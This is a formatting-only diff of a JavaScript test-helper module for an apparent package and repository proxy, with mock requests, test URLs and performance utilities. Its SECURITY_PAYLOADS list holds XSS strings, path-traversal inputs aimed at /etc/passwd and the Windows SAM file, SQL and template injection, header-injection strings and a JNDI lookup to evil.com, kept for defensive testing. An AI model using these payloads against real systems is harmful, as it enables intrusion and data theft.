@@ -10,11 +10,11 @@
  */
 export function createMockRequest(url, options = {}) {
   const defaultOptions = {
-    method: 'GET',
+    method: "GET",
     headers: {
-      'User-Agent': 'Mozilla/5.0 (Test)',
-      Accept: '*/*'
-    }
+      "User-Agent": "Mozilla/5.0 (Test)",
+      Accept: "*/*",
+    },
   };
 
   return new Request(url, { ...defaultOptions, ...options });
@@ -26,13 +26,13 @@ export function createMockRequest(url, options = {}) {
  * @param {Object} options - Response options
  * @returns {Response} Mock response object
  */
-export function createMockResponse(body = 'OK', options = {}) {
+export function createMockResponse(body = "OK", options = {}) {
   const defaultOptions = {
     status: 200,
-    statusText: 'OK',
+    statusText: "OK",
     headers: {
-      'Content-Type': 'text/plain'
-    }
+      "Content-Type": "text/plain",
+    },
   };
 
   return new Response(body, { ...defaultOptions, ...options });
@@ -44,18 +44,20 @@ export function createMockResponse(body = 'OK', options = {}) {
  * @param {string} service - Git service (upload-pack or receive-pack)
  * @returns {Request} Git request object
  */
-export function createGitRequest(url, service = 'git-upload-pack') {
-  const gitUrl = url.includes('?') ? `${url}&service=${service}` : `${url}?service=${service}`;
+export function createGitRequest(url, service = "git-upload-pack") {
+  const gitUrl = url.includes("?")
+    ? `${url}&service=${service}`
+    : `${url}?service=${service}`;
 
   return new Request(gitUrl, {
-    method: service === 'git-upload-pack' ? 'GET' : 'POST',
+    method: service === "git-upload-pack" ? "GET" : "POST",
     headers: {
-      'User-Agent': 'git/2.34.1',
-      'Git-Protocol': 'version=2',
-      ...(service !== 'git-upload-pack' && {
-        'Content-Type': `application/x-${service}-request`
-      })
-    }
+      "User-Agent": "git/2.34.1",
+      "Git-Protocol": "version=2",
+      ...(service !== "git-upload-pack" && {
+        "Content-Type": `application/x-${service}-request`,
+      }),
+    },
   });
 }
 
@@ -66,7 +68,7 @@ export function createGitRequest(url, service = 'git-upload-pack') {
  * @returns {string} Complete test URL
  */
 export function generateTestUrl(platform, path) {
-  const baseUrl = 'https://example.com';
+  const baseUrl = "https://example.com";
   return `${baseUrl}/${platform}/${path}`;
 }
 
@@ -75,41 +77,49 @@ export function generateTestUrl(platform, path) {
  */
 export const TEST_URLS = {
   github: {
-    file: 'https://example.com/gh/microsoft/vscode/blob/main/package.json',
-    raw: 'https://example.com/gh/microsoft/vscode/raw/main/README.md',
-    release: 'https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip',
-    archive: 'https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip',
-    git: 'https://example.com/gh/microsoft/vscode.git'
+    file: "https://example.com/gh/microsoft/vscode/blob/main/package.json",
+    raw: "https://example.com/gh/microsoft/vscode/raw/main/README.md",
+    release:
+      "https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip",
+    archive:
+      "https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip",
+    git: "https://example.com/gh/microsoft/vscode.git",
   },
   gitlab: {
-    file: 'https://example.com/gl/gitlab-org/gitlab/-/blob/master/package.json',
-    raw: 'https://example.com/gl/gitlab-org/gitlab/-/raw/master/README.md',
-    archive: 'https://example.com/gl/gitlab-org/gitlab/-/archive/master/gitlab-master.zip',
-    git: 'https://example.com/gl/gitlab-org/gitlab.git'
+    file: "https://example.com/gl/gitlab-org/gitlab/-/blob/master/package.json",
+    raw: "https://example.com/gl/gitlab-org/gitlab/-/raw/master/README.md",
+    archive:
+      "https://example.com/gl/gitlab-org/gitlab/-/archive/master/gitlab-master.zip",
+    git: "https://example.com/gl/gitlab-org/gitlab.git",
   },
   huggingface: {
-    model: 'https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/config.json',
-    dataset: 'https://example.com/hf/datasets/squad/resolve/main/train.json',
-    file: 'https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/pytorch_model.bin'
+    model:
+      "https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/config.json",
+    dataset: "https://example.com/hf/datasets/squad/resolve/main/train.json",
+    file:
+      "https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/pytorch_model.bin",
   },
   npm: {
-    package: 'https://example.com/npm/react',
-    tarball: 'https://example.com/npm/react/-/react-18.2.0.tgz',
-    scoped: 'https://example.com/npm/@types/node',
+    package: "https://example.com/npm/react",
+    tarball: "https://example.com/npm/react/-/react-18.2.0.tgz",
+    scoped: "https://example.com/npm/@types/node",
     // Test case for the specific npm package that caused the issue
-    npmPackage: 'https://example.com/npm/npm',
-    npmTarball: 'https://example.com/npm/npm/-/npm-11.5.1.tgz'
+    npmPackage: "https://example.com/npm/npm",
+    npmTarball: "https://example.com/npm/npm/-/npm-11.5.1.tgz",
   },
   pypi: {
-    simple: 'https://example.com/pypi/simple/requests/',
-    package: 'https://example.com/pypi/packages/source/r/requests/requests-2.31.0.tar.gz',
-    wheel: 'https://example.com/pypi/packages/py3/r/requests/requests-2.31.0-py3-none-any.whl'
+    simple: "https://example.com/pypi/simple/requests/",
+    package:
+      "https://example.com/pypi/packages/source/r/requests/requests-2.31.0.tar.gz",
+    wheel:
+      "https://example.com/pypi/packages/py3/r/requests/requests-2.31.0-py3-none-any.whl",
   },
   conda: {
-    main: 'https://example.com/conda/pkgs/main/linux-64/numpy-1.24.3.conda',
-    community: 'https://example.com/conda/community/conda-forge/linux-64/repodata.json',
-    repodata: 'https://example.com/conda/pkgs/main/linux-64/repodata.json'
-  }
+    main: "https://example.com/conda/pkgs/main/linux-64/numpy-1.24.3.conda",
+    community:
+      "https://example.com/conda/community/conda-forge/linux-64/repodata.json",
+    repodata: "https://example.com/conda/pkgs/main/linux-64/repodata.json",
+  },
 };
 
 /**
@@ -117,23 +127,28 @@ export const TEST_URLS = {
  */
 export const SECURITY_PAYLOADS = {
   xss: [
-    '<script>alert(1)</script>',
-    'javascript:alert(1)',
+    "<script>alert(1)</script>",
+    "javascript:alert(1)",
     '"><script>alert(1)</script>',
-    "';alert(1);//"
+    "';alert(1);//",
   ],
   pathTraversal: [
-    '../../../etc/passwd',
-    '..%2F..%2F..%2Fetc%2Fpasswd',
-    '..\\..\\..\\windows\\system32\\config\\sam',
-    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+    "../../../etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "..\\..\\..\\windows\\system32\\config\\sam",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
   ],
-  injection: ["'; DROP TABLE users; --", '${jndi:ldap://evil.com}', '{{7*7}}', '<%=7*7%>'],
+  injection: [
+    "'; DROP TABLE users; --",
+    "${jndi:ldap://evil.com}",
+    "{{7*7}}",
+    "<%=7*7%>",
+  ],
   headerInjection: [
-    'value\r\nX-Injected: malicious',
-    'value\nX-Injected: malicious',
-    'value\r\n\r\n<script>alert(1)</script>'
-  ]
+    "value\r\nX-Injected: malicious",
+    "value\nX-Injected: malicious",
+    "value\r\n\r\n<script>alert(1)</script>",
+  ],
 };
 
 /**
@@ -150,7 +165,7 @@ export class PerformanceTestHelper {
    * @param {string} name - Measurement name
    * @returns {Promise<any>} Function result
    */
-  async measure(fn, name = 'operation') {
+  async measure(fn, name = "operation") {
     const start = performance.now();
     const result = await fn();
     const end = performance.now();
@@ -158,7 +173,7 @@ export class PerformanceTestHelper {
     this.measurements.push({
       name,
       duration: end - start,
-      timestamp: Date.now()
+      timestamp: Date.now(),
     });
 
     return result;
@@ -178,7 +193,7 @@ export class PerformanceTestHelper {
    * @returns {number} Average duration in milliseconds
    */
   getAverageDuration(name) {
-    const filtered = this.measurements.filter(m => m.name === name);
+    const filtered = this.measurements.filter((m) => m.name === name);
     if (filtered.length === 0) return 0;
 
     const total = filtered.reduce((sum, m) => sum + m.duration, 0);
@@ -201,14 +216,14 @@ export class PerformanceTestHelper {
  */
 export function mockFetch(url, options = {}) {
   // Simulate network delay
-  return new Promise(resolve => {
+  return new Promise((resolve) => {
     setTimeout(() => {
-      if (url.includes('error')) {
-        resolve(createMockResponse('Server Error', { status: 500 }));
-      } else if (url.includes('notfound')) {
-        resolve(createMockResponse('Not Found', { status: 404 }));
+      if (url.includes("error")) {
+        resolve(createMockResponse("Server Error", { status: 500 }));
+      } else if (url.includes("notfound")) {
+        resolve(createMockResponse("Not Found", { status: 404 }));
       } else {
-        resolve(createMockResponse('Mock Response', { status: 200 }));
+        resolve(createMockResponse("Mock Response", { status: 200 }));
       }
     }, 10);
   });
@@ -220,7 +235,7 @@ export function mockFetch(url, options = {}) {
  * @param {string} version - Package version
  * @returns {Object} Mock npm registry response
  */
-export function createMockNpmRegistryResponse(packageName, version = '1.0.0') {
+export function createMockNpmRegistryResponse(packageName, version = "1.0.0") {
   return {
     name: packageName,
     versions: {
@@ -228,15 +243,16 @@ export function createMockNpmRegistryResponse(packageName, version = '1.0.0') {
         name: packageName,
         version: version,
         dist: {
-          tarball: `https://registry.npmjs.org/${packageName}/-/${packageName}-${version}.tgz`,
-          shasum: 'mock-shasum',
-          integrity: 'mock-integrity'
-        }
-      }
+          tarball:
+            `https://registry.npmjs.org/${packageName}/-/${packageName}-${version}.tgz`,
+          shasum: "mock-shasum",
+          integrity: "mock-integrity",
+        },
+      },
     },
-    'dist-tags': {
-      latest: version
-    }
+    "dist-tags": {
+      latest: version,
+    },
   };
 }
 
@@ -247,20 +263,20 @@ export function createMockNpmRegistryResponse(packageName, version = '1.0.0') {
  */
 export function validateSecurityHeaders(response) {
   const requiredHeaders = [
-    'Strict-Transport-Security',
-    'X-Frame-Options',
-    'X-XSS-Protection',
-    'Content-Security-Policy',
-    'Referrer-Policy'
+    "Strict-Transport-Security",
+    "X-Frame-Options",
+    "X-XSS-Protection",
+    "Content-Security-Policy",
+    "Referrer-Policy",
   ];
 
   const results = {
     passed: true,
     missing: [],
-    present: []
+    present: [],
   };
 
-  requiredHeaders.forEach(header => {
+  requiredHeaders.forEach((header) => {
     if (response.headers.has(header)) {
       results.present.push(header);
     } else {
@@ -282,8 +298,9 @@ export const TestDataGenerator = {
    * @returns {string} Random string
    */
   randomString(length = 10) {
-    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let result = '';
+    const chars =
+      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    let result = "";
     for (let i = 0; i < length; i++) {
       result += chars.charAt(Math.floor(Math.random() * chars.length));
     }
@@ -295,8 +312,8 @@ export const TestDataGenerator = {
    * @returns {string} Repository path
    */
   githubRepo() {
-    const users = ['microsoft', 'google', 'facebook', 'apple', 'amazon'];
-    const repos = ['vscode', 'react', 'angular', 'vue', 'node'];
+    const users = ["microsoft", "google", "facebook", "apple", "amazon"];
+    const repos = ["vscode", "react", "angular", "vue", "node"];
     const user = users[Math.floor(Math.random() * users.length)];
     const repo = repos[Math.floor(Math.random() * repos.length)];
     return `${user}/${repo}`;
@@ -307,12 +324,18 @@ export const TestDataGenerator = {
    * @returns {string} File path
    */
   filePath() {
-    const dirs = ['src', 'lib', 'test', 'docs', 'config'];
-    const files = ['index.js', 'main.py', 'README.md', 'package.json', 'config.yml'];
+    const dirs = ["src", "lib", "test", "docs", "config"];
+    const files = [
+      "index.js",
+      "main.py",
+      "README.md",
+      "package.json",
+      "config.yml",
+    ];
     const dir = dirs[Math.floor(Math.random() * dirs.length)];
     const file = files[Math.floor(Math.random() * files.length)];
     return `${dir}/${file}`;
-  }
+  },
 };
 
 /**
@@ -332,5 +355,5 @@ export function timeout(ms) {
  * @returns {Promise} Promise that resolves after the specified time
  */
 export function wait(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+  return new Promise((resolve) => setTimeout(resolve, ms));
 }
